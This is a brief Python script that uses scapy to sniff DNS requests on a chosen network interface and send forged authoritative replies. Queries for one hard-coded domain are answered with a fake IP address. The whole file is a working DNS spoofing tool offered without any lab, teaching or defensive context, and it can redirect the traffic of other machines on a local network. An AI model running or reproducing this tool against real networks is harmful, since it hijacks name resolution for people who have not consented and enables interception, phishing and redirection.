from scapy.all import *
import socket

# Spoof settings
TARGET_DOMAIN = b"zsbitovska.com."
FAKE_IP = "142.250.190.14"  # IP address of google.com

# Interface to sniff on
INTERFACE = "WiFi 2"  # Change to your network interface (e.g., wlan0)

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:  # DNS request
        qname = pkt[DNSQR].qname
        if qname == TARGET_DOMAIN:
            print(f"[+] Spoofing DNS for {qname.decode()}")
            
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=53) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=qname, ttl=300, rdata=FAKE_IP))
            send(spoofed_pkt, verbose=0)

print(f"[*] Listening for DNS requests on {INTERFACE}...")
sniff(iface=INTERFACE, filter="udp port 53", store=0, prn=dns_spoof)
